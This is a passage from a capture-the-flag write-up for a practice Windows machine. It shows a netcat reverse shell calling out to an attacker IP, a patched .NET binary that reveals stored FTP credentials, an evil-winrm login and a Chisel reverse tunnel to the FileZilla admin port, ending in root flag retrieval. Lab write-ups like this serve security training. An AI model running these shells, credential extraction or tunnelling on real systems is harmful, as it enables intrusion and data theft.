<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-reverse.bat" data-lang="reverse.bat">\users\userpool\music\nc64.exe -e cmd.exe 10.10.14.70 8000
c:<span style="color:#8be9fd;font-style:italic">\users\userpool\music\nc64.exe</span><span style="color:#6272a4"> -e cmd.exe 10.10.14.70 8000</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="beyond-root-exploiting-sync2ftp-to-find-the-superadmin-password">Beyond root: Exploiting Sync2Ftp to find the superadmin password</h2>
<p>Download the Sync2Ftp* files in ProgramFiles</p>
<p>The configuration contains the username and password but it is encrypted
<!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>The exe is dotNet file, so we shoud be able to audit and change the code</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file SyncLocation.exe
SyncLocation.exe: PE32 executable <span style="color:#ff79c6">(</span>GUI<span style="color:#ff79c6">)</span> Intel <span style="color:#bd93f9">80386</span> Mono/.Net assembly, <span style="color:#ff79c6">for</span> MS Windows
</code></pre></td></tr></table>
</div>
</div><p>upload those file in CommandoVM to decompile with dnsSpy</p>
<p>We can edit and save the source code to pop-up a MessageBox</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Java" data-lang="Java"><span style="color:#ff79c6">[..]</span>
using System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Configuration</span><span style="color:#ff79c6">;</span>
using System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Windows</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Forms</span><span style="color:#ff79c6">;</span>

namespace SyncLocation
<span style="color:#ff79c6">{</span>
	<span style="color:#6272a4">// Token: 0x02000005 RID: 5
</span><span style="color:#6272a4"></span>	internal <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Program</span>
	<span style="color:#ff79c6">{</span>
		<span style="color:#6272a4">// Token: 0x0600000F RID: 15
</span><span style="color:#6272a4"></span>		<span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">Main</span><span style="color:#ff79c6">()</span>
		<span style="color:#ff79c6">{</span>
			string cipherString3 <span style="color:#ff79c6">=</span> ConfigurationManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">AppSettings</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;user&#34;</span><span style="color:#ff79c6">];</span>
			string cipherString2 <span style="color:#ff79c6">=</span> ConfigurationManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">AppSettings</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;password&#34;</span><span style="color:#ff79c6">];</span>
			string str <span style="color:#ff79c6">=</span> Crypto<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Decrypt</span><span style="color:#ff79c6">(</span>cipherString3<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
			string password <span style="color:#ff79c6">=</span> Crypto<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Decrypt</span><span style="color:#ff79c6">(</span>cipherString2<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
			MessageBox<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Show</span><span style="color:#ff79c6">(</span>str <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;:&#34;</span> <span style="color:#ff79c6">+</span> password<span style="color:#ff79c6">);</span>
            <span style="color:#ff79c6">[..]</span>
		<span style="color:#ff79c6">}</span>
	<span style="color:#ff79c6">}</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>The user and password are <code>superadmin:funnyhtb</code></p>
<p>We can now connect the ftp server. Because we are behind a NAT and a firewall,
we have to connect in passive mode, otherwise our ftp client will send the internal and non-reachable IP address.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~$ ftp -p 10.10.10.158
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">220</span> Please visit https://filezilla-project.org/
Name <span style="color:#ff79c6">(</span>10.10.10.158:ctf<span style="color:#ff79c6">)</span>: superadmin
<span style="color:#bd93f9">331</span> Password required <span style="color:#ff79c6">for</span> superadmin
Password:
<span style="color:#bd93f9">230</span> Logged on
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Desktop
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Desktop&#34;</span> is current directory.
ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,217,165<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> directory listing of <span style="color:#f1fa8c">&#34;/Desktop&#34;</span>
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp            <span style="color:#bd93f9">282</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> desktop.ini
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp             <span style="color:#bd93f9">32</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> root.txt
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Desktop&#34;</span>
ftp&gt; get root.txt
local: root.txt remote: root.txt
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,228,110<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> file download from server of <span style="color:#f1fa8c">&#34;/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">32</span> bytes received in 0.00 secs <span style="color:#ff79c6">(</span>39.8597 kB/s<span style="color:#ff79c6">)</span>
ftp&gt; bye
<span style="color:#bd93f9">221</span> Goodbye
ctf@6274ae97a895:~$ cat root.txt
3cc85d1bed2ee84af4074101b991d441
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s install evil-winrm to remote connect our windows box from linux</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt-get install ruby-dev
sudo gem install winrm winrm-fs stringio
git clone https://github.com/Hackplayers/evil-winrm.git
./evil-winrm.rb -i 10.10.10.158 -u superadmin -p funnyhtb
</code></pre></td></tr></table>
</div>
</div><h2 id="tunneling-on-windows-with-chisel">Tunneling on Windows with Chisel</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml | grep -i <span style="color:#f1fa8c">&#34;admin port&#34;</span>
        &lt;Item <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Admin port&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;numeric&#34;</span>&gt;14147&lt;/Item&gt;
</code></pre></td></tr></table>
</div>
</div><p>Download Chisel</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/jpillora/chisel
<span style="color:#8be9fd;font-style:italic">cd</span> chisel
go build
cp .<span style="color:#f1fa8c">\c</span>hisel.exe ../../../Desktop/share/
</code></pre></td></tr></table>
</div>
</div><p>The FileZilla Server interface.exe is a windows binary so we will use our Commando VM to spawn a shell from the remote machine.
Once the Shell is obtained, we can start the chisel server on port 9000</p>
<pre tabindex="0"><code>PS C:\Users\User\Documents\github\chisel &gt; ./chisel.exe server --host 192.168.99.104 --port 9000 --reverse
</code></pre><p>Then we can port forward on client side:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; ./chisel client 10.10.14.149:9000 R:14147:127.0.0.1:14147
2020/02/19 12:20:50 client: Connecting to ws://10.10.14.149:9000
2020/02/19 12:20:51 client: Fingerprint 26:4c:e5:bd:cc:60:be:d2:3c:37:9a:d5:9e:b2:4d:37
2020/02/19 12:20:53 client: server: server: proxy#1:R:0.0.0.0:14147<span style="color:#ff79c6">=</span>&gt;127.0.0.1:14147: listen tcp4 0.0.0.0:14147: bind: Only one usage of each socket address <span style="color:#ff79c6">(</span>protocol/network address/port<span style="color:#ff79c6">)</span> is normally permitted.
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt;
</code></pre></td></tr></table>
</div>
</div><p>On server side we can see as well the connection is established and the port listening on port 14147</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\s</span>hare &gt; ./chisel.exe server --host 0.0.0.0 --port <span style="color:#bd93f9">9000</span> --reverse
2020/02/19 05:18:20 server: Reverse tunnelling enabled
2020/02/19 05:18:20 server: Fingerprint 26:4c:e5:bd:cc:60:be:d2:3c:37:9a:d5:9e:b2:4d:37
2020/02/19 05:18:20 server: Listening on 0.0.0.0:9000...
2020/02/19 05:18:41 server: proxy#1:R:0.0.0.0:14147<span style="color:#ff79c6">=</span>&gt;127.0.0.1:14147: Listening
</code></pre></td></tr></table>
</div>
</div><p>Indeed netstat shows the port is listening</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>ocuments<span style="color:#f1fa8c">\g</span>ithub<span style="color:#f1fa8c">\c</span>hisel &gt; netstat -an | findstr <span style="color:#bd93f9">141</span>
  TCP    0.0.0.0:14147          0.0.0.0:0              LISTENING
  TCP    127.0.0.1:1045         127.0.0.1:14147        ESTABLISHED
  TCP    127.0.0.1:14147        127.0.0.1:1045         ESTABLISHED
</code></pre></td></tr></table>
</div>
</div><p>We download FileZilla Server.exe with Firefox, and we connect it locally to the port 14147.
We are now able to create a new dummy user &lsquo;dummy&rsquo; and give him write permissions on a new share folder pointing at &lsquo;C:'.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~ $ ftp -p 10.10.10.158
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">220</span> Please visit https://filezilla-project.org/
Name <span style="color:#ff79c6">(</span>10.10.10.158:ctf<span style="color:#ff79c6">)</span>: qwerty
<span style="color:#bd93f9">331</span> Password required <span style="color:#ff79c6">for</span> qwerty
Password:
<span style="color:#bd93f9">230</span> Logged on
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Users
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> userpool
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users/userpool&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> ..
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> superadmin
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users/superadmin&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Desktop
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop&#34;</span> is current directory.
ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,254,76<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> directory listing of <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop&#34;</span>
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp            <span style="color:#bd93f9">282</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> desktop.ini
-r--r--r-- <span style="color:#bd93f9">1</span> ftp ftp             <span style="color:#bd93f9">32</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> root.txt
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop&#34;</span>
ftp&gt; get root.txt
local: root.txt remote: root.txt
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,203,179<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> file download from server of <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop/root.txt&#34;</span>
<span style="color:#bd93f9">32</span> bytes received in 0.00 secs <span style="color:#ff79c6">(</span>395.5696 kB/s<span style="color:#ff79c6">)</span>
ftp&gt;
</code></pre></td></tr></table>
</div>
</div><p>The flag is finally obtained ;)</p>
<p>We can now clean by deleting some binaries.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
